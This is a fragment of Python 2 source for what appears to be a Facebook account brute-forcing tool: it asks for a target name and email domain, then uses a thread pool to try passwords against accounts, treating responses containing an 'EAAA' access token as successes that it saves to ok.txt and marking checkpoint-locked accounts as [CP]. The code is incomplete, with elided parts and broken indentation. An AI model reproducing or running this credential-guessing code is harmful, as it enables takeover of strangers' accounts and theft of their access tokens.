...
def email():
  data = []
  nama=raw_input(k+"\n["+p+"•"+k+"]"+p+" Name Target               : ")
  print(k+"["+p+"•"+k+"]"+p+           " [g]mail, [y]ahoo, [h]otmail")
  domain=raw_input(k+"["+p+"•"+k+"]"+p+" Choose Domain             : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  print(k+"["+p+"!"+k+"]"+p+" Fill In The Correct") if not domain in ['g','y','h'] else ''
   raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
   menu()
  ...
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brutemail, user['user'], user['pw']): user for user in data}
  print("\n\x1b[0;37m[•] Finished")

def brutemail(user, passs):
  try:
    for pw in passs:
      params={
      ...
      if re.search('(EAAA)\w+', str(response.text)):
        print("\x1b[0;32m[OK] %s • %s "%(str(user), str(pw)))
        open("ok.txt","a+").write("%s • %s\n"%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print("\x1b[0;33m[CP] %s • %s "%(str(user), str(pw)))
